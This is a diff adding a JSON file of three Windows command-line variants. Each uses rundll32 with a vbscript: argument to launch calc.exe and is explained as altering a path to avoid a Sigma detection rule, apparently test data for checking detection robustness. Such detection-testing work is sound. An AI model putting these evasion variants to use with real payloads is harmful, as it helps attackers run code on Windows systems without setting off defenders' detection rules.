@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c rundll32 vbscript:\"C:\\Lab\\input\\sample.txt,#135\" +String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "Substitution: Replaced the suspicious path \"\\..\\mshtml\" with a benign lab placeholder \"C:\\Lab\\input\\sample.txt\" to avoid triggering the Sigma rule's path and keyword match."
+  },
+  {
+    "output": "cmd.exe /c rundll32 vbscript:\"C:\\Lab\\input\\sample.log,RunHTMLApplication\" +String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "Substitution: Replaced the suspicious path \"\\..\\mshtml\" with a benign lab placeholder \"C:\\Lab\\input\\sample.log\" to avoid triggering the Sigma rule's path and keyword match."
+  },
+  {
+    "output": "cmd.exe /c rundll32 vbscript:\"C:\\Lab\\input\\sample.7z,#135\" +String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "Substitution: Replaced the suspicious path \"\\..\\mshtml\" with a benign lab placeholder \"C:\\Lab\\input\\sample.7z\" to avoid triggering the Sigma rule's path and keyword match."
+  }
+]
